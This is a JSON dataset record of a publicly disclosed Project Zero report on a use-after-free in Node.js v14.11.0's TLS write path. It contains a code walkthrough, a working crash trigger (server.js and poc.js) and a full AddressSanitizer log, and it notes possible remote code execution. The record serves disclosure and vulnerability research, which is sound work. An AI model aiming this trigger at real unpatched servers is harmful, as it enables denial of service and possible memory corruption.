{
  "reported_to": "Node.js",
  "reported_by": "fwilhelm ",
  "title": "Node.js: use-after-free in TLSWrap",
  "content": "\nNode.js: use-after-free in TLSWrap\nNode v14.11.0 (Current) is vulnerable to a use-after-free bug in its TLS implementation.\nWhen writing to a TLS enabled socket, node::StreamBase::Write calls node::TLSWrap::DoWrite\nwith a freshly allocated WriteWrap object as first argument. If the DoWrite method\ndoes not return an error, this object is passed back to the caller as part of a\nStreamWriteResult structure:\n// stream_base-inl.h\nWriteWrap* req_wrap = CreateWriteWrap(req_wrap_obj);\nerr = DoWrite(req_wrap, bufs, count, send_handle);\nbool async = err == 0;\nif (!async) {\nreq_wrap->Dispose();\nreq_wrap = nullptr;\n}\nconst char* msg = Error();\nif (msg != nullptr) {\nreq_wrap_obj->Set(env->context(),\nenv->error_string(),\nOneByteString(env->isolate(), msg)).Check();\nClearError();\n}\nreturn StreamWriteResult { async, err, req_wrap, total_bytes };\nThe problem is that TLSWrap::DoWrite can trigger a free of the WriteWrap object\nwithout returning an error when the EncOut() call at the end of the DoWrite method fails.\nEncOut() calls underlying_stream()->Write() to write TLS encrypted data to the network socket.\nIf this write fails, InvokeQueued() is called and the function returns immediately:\n// tlswrap.cc\n// Write any encrypted/handshake output that may be ready.\n// Guard against sync call of current_write->Done(), its unsupported.\nindowrite = true;\nEncOut();\nindowrite = false;\nreturn 0;\n// tls_wrap.cc\nvoid TLSWrap::EncOut() {\n[...]\nDebug(this, \"Writing %zu buffers to the underlying stream\", count);\nStreamWriteResult res = underlying_stream()->Write(bufs, count);\nif (res.err != 0) {\nInvokeQueued(res.err);\nreturn;\n}\n[..]\nInvokeQueued() triggers an immediate free of the req_wrap WriteWrap* object via the\nfollowing call chain:\nnode::TLSWrap::InvokeQueued -> node::StreamReq::Done -> node::WriteWrap::OnDone\n-> node::StreamReq::Dispose -> node::BaseObjectPtrImpl<node::AsyncWrap, false>::~BaseObjectPtrImpl()\n-> node::BaseObject::decrease_refcount() -> node::SimpleWriteWrap<node::AsyncWrap>::~SimpleWriteWrap()\nMaking underlying_stream()->Write fail is as easy as closing the socket at the other side\nof the connection just before the write to trigger a broken pipe error.\nBecause node::TLSWrap::DoWrite doesn't return an error code, node::StreamBase::Write will return\nthe freed WriteWrap object as part of its StreamWriteResult. For calls by node::StreamBase::WriteV,\nthis will immediately trigger a use-after-free when the SetAllocatedStorage() method\nis called on the freed object:\n// stream_base.cc\nStreamWriteResult res = Write(*bufs, count, nullptr, req_wrap_obj);\nSetWriteResult(res);\nif (res.wrap != nullptr && storage_size > 0) {\nres.wrap->SetAllocatedStorage(std::move(storage));\n}\nThe bug can be easily triggered against a simple node HTTPS server application. Under normal\ncircumstances and without an ASAN enabled build, the UAF doesn't trigger a crash on Linux\nas the freed memory won't get reallocated in time and the write in SetAllocatedStorage\ncorrupts chunk metadata that isn't used for small chunks.\nI think this is the only reason why the bug wasn't spotted earlier, as the broken pipe error path should be hit\npretty often in the real world. However, this issue might still be exploitable with the right heap layout\n(if the WriteWrap chunk is merged with a larger chunk during the free), different heap implementations\nand/or some other control flow that allows to allocate something before the reuse.\nProof-of-Concept:\nserver.js:\nCode 1.09 KiB\n1const https = require('https');\n2\n3const key = `-----BEGIN EC PARAMETERS-----\n4BggqhkjOPQMBBw==\n5-----END EC PARAMETERS-----\n6-----BEGIN EC PRIVATE KEY-----\n7MHcCAQEEIDKfHHbiJMdu2STyHL11fWC7psMY19/gUNpsUpkwgGACoAoGCCqGSM49\n8AwEHoUQDQgAEItqm+pYj3Ca8bi5mBs+H8xSMxuW2JNn4I+kw3aREsetLk8pn3o81\n9PWBiTdSZrGBGQSy+UAlQvYeE6Z/QXQk8aw==\n10-----END EC PRIVATE KEY-----`\n11\n12const cert = `-----BEGIN CERTIFICATE-----\n13MIIBhjCCASsCFDJU1tCo88NYU//pE+DQKO9hUDsFMAoGCCqGSM49BAMCMEUxCzAJ\n14BgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5l\n15dCBXaWRnaXRzIFB0eSBMdGQwHhcNMjAwOTIyMDg1NDU5WhcNNDgwMjA3MDg1NDU5\n16WjBFMQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UECgwY\n17SW50ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcD\n18QgAEItqm+pYj3Ca8bi5mBs+H8xSMxuW2JNn4I+kw3aREsetLk8pn3o81PWBiTdSZ\n19rGBGQSy+UAlQvYeE6Z/QXQk8azAKBggqhkjOPQQDAgNJADBGAiEA7Bdn4F87KqIe\n20Y/ABy/XIXXpFUb2nyv3zV7POQi2lPcECIQC3UWLmfiedpiIKsf9YRIyO0uEood7+\n21glj2R1NNr1X68w==\n22-----END CERTIFICATE-----`\n23\n24const options = {\n25  key: key,\n26  cert: cert,\n27};\n28\n29https.createServer(options, function (req, res) {\n30  res.writeHead(200);\n31  res.end(\"hello world\\n\");\n32}).listen(4444);\n\npoc.js:\nCode 449 Bytes\n1const tls = require('tls')\n2\n3var socket = tls.connect(4444, 'localhost', {rejectUnauthorized : false}, () => {\n4  console.log(\"connected\")\n5  socket.write(\"GET / HTTP/1.1\\r\\nHost: localhost\\r\\nConnection: Keep-alive\\r\\n\\r\\n\")\n6  socket.write(\"GET / HTTP/1.1\\r\\nHost: localhost\\r\\nConnection: Keep-alive\\r\\n\\r\\n\")\n7  socket.write(\"GET / HTTP/1.1\\r\\nHost: localhost\\r\\nConnection: Keep-alive\\r\\n\\r\\n\")\n8})\n9\n10\n11socket.on('data', () => {\n12  socket.destroy()\n13})  \nThe POC triggers a crash when server.js is run on an ASAN enabled build of node.js:\nCode 8.55 KiB\n1==1408671==ERROR: AddressSanitizer: heap-use-after-free on address 0x608000011138 at pc 0x0000011929b6 bp 0x7ffc8c2243f0 sp 0x7ffc8c2243e8\n2READ of size 8 at 0x608000011138 thread T0\n3    #0 0x11929b5 in std::__uniq_ptr_impl<v8::BackingStore, std::default_delete<v8::BackingStore> >::_M_ptr() const /usr/bin/../lib/gcc/x86_64-linux-gnu/9/../../../../include/c++/9/bits/unique_ptr.h:154:42\n4    #1 0x1192974 in std::unique_ptr<v8::BackingStore, std::default_delete<v8::BackingStore> >::get() const /usr/bin/../lib/gcc/x86_64-linux-gnu/9/../../../../include/c++/9/bits/unique_ptr.h:361:21\n5    #2 0x1193fb4 in std::unique_ptr<v8::BackingStore, std::default_delete<v8::BackingStore> >::operator bool() const /usr/bin/../lib/gcc/x86_64-linux-gnu/9/../../../../include/c++/9/bits/unique_ptr.h:375:16\n6    #3 0x1190415 in node::AllocatedBuffer::data() /pwd/out/../src/allocated_buffer-inl.h:79:8\n7    #4 0x16f8a79 in node::WriteWrap::SetAllocatedStorage(node::AllocatedBuffer&&) /pwd/out/../src/stream_base-inl.h:247:3\n8    #5 0x16f1141 in node::StreamBase::Writev(v8::FunctionCallbackInfo<v8::Value> const&) /pwd/out/../src/stream_base.cc:172:15\n9    #6 0x16faa47 in void node::StreamBase::JSMethod<&(node::StreamBase::Writev(v8::FunctionCallbackInfo<v8::Value> const&))>(v8::FunctionCallbackInfo<v8::Value> const&) /pwd/out/../src/stream_base.cc:468:29\n10    #7 0x1caf642 in v8::internal::FunctionCallbackArguments::Call(v8::internal::CallHandlerInfo) /pwd/out/../deps/v8/src/api/api-arguments-inl.h:158:3\n11    #8 0x1cabfaf in v8::internal::MaybeHandle<v8::internal::Object> v8::internal::(anonymous namespace)::HandleApiCallHelper<false>(v8::internal::Isolate*, v8::internal::Handle<v8::internal::HeapObject>, v8::internal::Handle<v8::internal::HeapObject>, v8::internal::Handle<v8::internal::FunctionTemplateInfo>, v8::internal::Handle<v8::internal::Object>, v8::internal::BuiltinArguments) /pwd/out/../deps/v8/src/builtins/builtins-api.cc:111:36\n12    #9 0x1ca8f8a in v8::internal::Builtin_Impl_HandleApiCall(v8::internal::BuiltinArguments, v8::internal::Isolate*) /pwd/out/../deps/v8/src/builtins/builtins-api.cc:141:5\n13    #10 0x1ca81e0 in v8::internal::Builtin_HandleApiCall(int, unsigned long*, v8::internal::Isolate*) /pwd/out/../deps/v8/src/builtins/builtins-api.cc:129:1\n14    #11 0x3e096df in Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_BuiltinExit (/p0/node/node-v14.11.0/out/Debug/node+0x3e096df)\n15\n160x608000011138 is located 24 bytes inside of 88-byte region [0x608000011120,0x608000011178)\n17freed by thread T0 here:\n18    #0 0xe79b1d in operator delete(void*) (/p0/node/node-v14.11.0/out/Debug/node+0xe79b1d)\n19    #1 0x1707177 in node::SimpleWriteWrap<node::AsyncWrap>::~SimpleWriteWrap() /pwd/out/../src/stream_base.h:418:7\n20    #2 0xf943be in node::BaseObject::decrease_refcount() /pwd/out/../src/base_object-inl.h:203:7\n21    #3 0x10886e6 in node::BaseObjectPtrImpl<node::AsyncWrap, false>::~BaseObjectPtrImpl() /pwd/out/../src/base_object-inl.h:248:12\n22    #4 0x13c2a3c in node::StreamReq::Dispose() /pwd/out/../src/stream_base-inl.h:40:1\n23    #5 0x16f794c in node::WriteWrap::OnDone(int) /pwd/out/../src/stream_base.cc:591:3\n24    #6 0x10e71f8 in node::StreamReq::Done(int, char const*) /pwd/out/../src/stream_base-inl.h:261:3\n25    #7 0x1921f95 in node::TLSWrap::InvokeQueued(int, char const*) /pwd/out/../src/tls_wrap.cc:101:8\n26    #8 0x1927f39 in node::TLSWrap::EncOut() /pwd/out/../src/tls_wrap.cc:356:5\n27    #9 0x192e258 in node::TLSWrap::DoWrite(node::WriteWrap*, uv_buf_t*, unsigned long, uv_stream_s*) /pwd/out/../src/tls_wrap.cc:820:3\n28    #10 0x13b50dd in node::StreamBase::Write(uv_buf_t*, unsigned long, uv_stream_s*, v8::Local<v8::Object>) /pwd/out/../src/stream_base-inl.h:193:9\n29    #11 0x16f108f in node::StreamBase::Writev(v8::FunctionCallbackInfo<v8::Value> const&) /pwd/out/../src/stream_base.cc:169:27\n30    #12 0x16faa47 in void node::StreamBase::JSMethod<&(node::StreamBase::Writev(v8::FunctionCallbackInfo<v8::Value> const&))>(v8::FunctionCallbackInfo<v8::Value> const&) /pwd/out/../src/stream_base.cc:468:29\n31    #13 0x1caf642 in v8::internal::FunctionCallbackArguments::Call(v8::internal::CallHandlerInfo) /pwd/out/../deps/v8/src/api/api-arguments-inl.h:158:3\n32    #14 0x1cabfaf in v8::internal::MaybeHandle<v8::internal::Object> v8::internal::(anonymous namespace)::HandleApiCallHelper<false>(v8::internal::Isolate*, v8::internal::Handle<v8::internal::HeapObject>, v8::internal::Handle<v8::internal::HeapObject>, v8::internal::Handle<v8::internal::FunctionTemplateInfo>, v8::internal::Handle<v8::internal::Object>, v8::internal::BuiltinArguments) /pwd/out/../deps/v8/src/builtins/builtins-api.cc:111:36\n33    #15 0x1ca8f8a in v8::internal::Builtin_Impl_HandleApiCall(v8::internal::BuiltinArguments, v8::internal::Isolate*) /pwd/out/../deps/v8/src/builtins/builtins-api.cc:141:5\n34    #16 0x1ca81e0 in v8::internal::Builtin_HandleApiCall(int, unsigned long*, v8::internal::Isolate*) /pwd/out/../deps/v8/src/builtins/builtins-api.cc:129:1\n35    #17 0x3e096df in Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_BuiltinExit (/p0/node/node-v14.11.0/out/Debug/node+0x3e096df)\n36 \n37previously allocated by thread T0 here:\n38    #0 0xe792bd in operator new(unsigned long) (/p0/node/node-v14.11.0/out/Debug/node+0xe792bd)\n39    #1 0x16f81c2 in node::StreamBase::CreateWriteWrap(v8::Local<v8::Object>) /pwd/out/../src/stream_base.cc:629:10\n40    #2 0x13b4fb0 in node::StreamBase::Write(uv_buf_t*, unsigned long, uv_stream_s*, v8::Local<v8::Object>) /pwd/out/../src/stream_base-inl.h:191:25\n41    #3 0x16f108f in node::StreamBase::Writev(v8::FunctionCallbackInfo<v8::Value> const&) /pwd/out/../src/stream_base.cc:169:27\n42    #4 0x16faa47 in void node::StreamBase::JSMethod<&(node::StreamBase::Writev(v8::FunctionCallbackInfo<v8::Value> const&))>(v8::FunctionCallbackInfo<v8::Value> const&) /pwd/out/../src/stream_base.cc:468:29\n43    #5 0x1caf642 in v8::internal::FunctionCallbackArguments::Call(v8::internal::CallHandlerInfo) /pwd/out/../deps/v8/src/api/api-arguments-inl.h:158:3\n44    #6 0x1cabfaf in v8::internal::MaybeHandle<v8::internal::Object> v8::internal::(anonymous namespace)::HandleApiCallHelper<false>(v8::internal::Isolate*, v8::internal::Handle<v8::internal::HeapObject>, v8::internal::Handle<v8::internal::HeapObject>, v8::internal::Handle<v8::internal::FunctionTemplateInfo>, v8::internal::Handle<v8::internal::Object>, v8::internal::BuiltinArguments) /pwd/out/../deps/v8/src/builtins/builtins-api.cc:111:36\n45    #7 0x1ca8f8a in v8::internal::Builtin_Impl_HandleApiCall(v8::internal::BuiltinArguments, v8::internal::Isolate*) /pwd/out/../deps/v8/src/builtins/builtins-api.cc:141:5\n46    #8 0x1ca81e0 in v8::internal::Builtin_HandleApiCall(int, unsigned long*, v8::internal::Isolate*) /pwd/out/../deps/v8/src/builtins/builtins-api.cc:129:1\n47    #9 0x3e096df in Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_BuiltinExit (/p0/node/node-v14.11.0/out/Debug/node+0x3e096df)\n48    #10 0x3c06181 in Builtins_InterpreterEntryTrampoline (/p0/node/node-v14.11.0/out/Debug/node+0x3c06181)\n49    #11 0x3c06181 in Builtins_InterpreterEntryTrampoline (/p0/node/node-v14.11.0/out/Debug/node+0x3c06181)\n50   \n51\n52SUMMARY: AddressSanitizer: heap-use-after-free /usr/bin/../lib/gcc/x86_64-linux-gnu/9/../../../../include/c++/9/bits/unique_ptr.h:154:42 in std::__uniq_ptr_impl<v8::BackingStore, std::default_delete<v8::BackingStore> >::_M_ptr() const\n53Shadow bytes around the buggy address:\n54  0x0c107fffa1d0: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd\n55  0x0c107fffa1e0: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd\n56  0x0c107fffa1f0: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd\n57  0x0c107fffa200: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 fa\n58  0x0c107fffa210: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd\n59=>0x0c107fffa220: fa fa fa fa fd fd fd[fd]fd fd fd fd fd fd fd fa\n60  0x0c107fffa230: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd\n61  0x0c107fffa240: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd\n62  0x0c107fffa250: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd\n63  0x0c107fffa260: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd\n64  0x0c107fffa270: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd\n65Shadow byte legend (one shadow byte represents 8 application bytes):\n66  Addressable:           00\n67  Partially addressable: 01 02 03 04 05 06 07\n68  Heap left redzone:       fa\n69  Freed heap region:       fd\n70  Stack left redzone:      f1\n71  Stack mid redzone:       f2\n72  Stack right redzone:     f3\n73  Stack after return:      f5\n74  Stack use after scope:   f8\n75  Global redzone:          f9\n76  Global init order:       f6\n77  Poisoned by user:        f7\n78  Container overflow:      fc\n79  Array cookie:            ac\n80  Intra object redzone:    bb\n81  ASan internal:           fe\n82  Left alloca redzone:     ca\n83  Right alloca redzone:    cb\n84  Shadow gap:              cc\n85==1408671==ABORTING\nCredits:\nFelix Wilhelm of Google Project Zero\nThis bug is subject to a 90 day disclosure deadline. After 90 days elapse, the bug report\nwill become visible to the public. The scheduled disclosure date is 2020-12-21.\nDisclosure at an earlier date is also possible if agreed upon by all parties.\nImpact\nRemote code execution\n\n",
  "severity": [
    7.5,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Use After Free"
  ],
  "screenshots": {},
  "disclosed_date": 1609852680,
  "report_url": "https://hackerone.com/reports/988103",
  "is_multi_component": false,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Set up a simple HTTPS server using Node.js v14.11.0 with the provided server.js code"
    ],
    [
      2,
      "Run the poc.js script which connects to the server, sends multiple HTTP requests, and immediately closes the socket upon receiving data"
    ]
  ],
  "vuln_description": "The vulnerability is a use-after-free bug in Node.js's TLS implementation (TLSWrap). When writing to a TLS-enabled socket, if the underlying stream write fails (e.g., due to a broken pipe from closing the socket), the WriteWrap object is freed but still returned to the caller, leading to potential memory corruption or remote code execution.",
  "reason": "This vulnerability requires understanding of Node.js's TLS implementation internals, including the interaction between WriteWrap objects, stream operations, and error handling paths. The bug manifests through a subtle timing condition where a socket closure during TLS write operations triggers an unexpected free of a critical object while it's still being used.",
  "new_complexity": "HIGH",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}